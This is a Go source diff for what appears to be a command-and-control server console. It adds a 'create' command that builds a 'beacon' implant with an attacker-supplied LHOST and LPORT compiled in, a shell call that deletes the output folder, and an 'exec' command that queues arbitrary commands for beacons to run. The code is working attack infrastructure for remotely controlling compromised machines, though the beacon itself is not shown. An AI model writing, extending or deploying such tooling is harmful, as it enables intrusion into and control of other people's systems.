@@ -7,7 +7,9 @@ import (
 	"log"
 	"encoding/json"
 	"net/http"
+	"strconv"
 	"os"
+	"os/exec"
 	"strings"
 	"bufio"
 	b64 "encoding/base64"
@@ -20,6 +22,11 @@ type CommandUpdate struct {
 }
 
 var execBuffer []string = make([]string, 0)
+var cmdArgs = map[string]string {
+    "help": "",
+    "exec": "<command>",
+    "create": "<LHOST> <LPORT>",
+}
 
 // to serve management interface
 func interfaceHandler(w http.ResponseWriter, h *http.Request) {
@@ -57,7 +64,7 @@ func startServerRoutine() {
 
 	srv := &http.Server{
         Handler:      router,
-        Addr:         "127.0.0.1:8000",
+        Addr:         "127.0.0.1:8001",
         WriteTimeout: 15 * time.Second,
         ReadTimeout:  15 * time.Second,
     }
@@ -67,13 +74,37 @@ func startServerRoutine() {
 	}()
 }
 
+func createBeacon(lhost string, lport string) {
+	exec.Command("/bin/sh", "-c", "rm out/*").Output()
+	exec.Command("/bin/sh", "-c", "go build -ldflags '-X main.cmdAddress=" + lhost + " -X main.cmdPort=" + lport + " -X main.cmdHost=command.com' -o out/beacon beacon/beacon.go").Output()
+	fmt.Println("Created beacon in out directory.")
+}
+
+func checkArgs(cmd[] string) (bool) {
+	amt := len(strings.Fields(cmdArgs[cmd[0]]))
+	if len(cmd[1:]) != amt {
+		if amt == 1 {
+			fmt.Println(cmd[0] + " requires " + strconv.Itoa(amt) + " arg: " + cmdArgs[cmd[0]])
+		} else {
+			fmt.Println(cmd[0] + " requires " + strconv.Itoa(amt) + " args: " + cmdArgs[cmd[0]])
+		}
+		return false
+	}
+	return true
+}
+
 func processInput(input string) {
 	cmd := strings.Fields(input);
-	switch cmd[0] {
-	case "exec": fallthrough
-	case "e":
-		fmt.Println("Adding exec command to buffer.")
-		execBuffer = append(execBuffer, strings.Join(cmd[1:], " "))
+	if checkArgs(cmd) {
+		switch cmd[0] {
+		case "exec":
+			fmt.Println("Adding exec command to buffer.")
+			execBuffer = append(execBuffer, strings.Join(cmd[1:], " "))
+		case "create":
+			createBeacon(cmd[1], cmd[2])
+		case "help":
+			//printHelp(cmd[1:])
+		}
 	}
 }
 
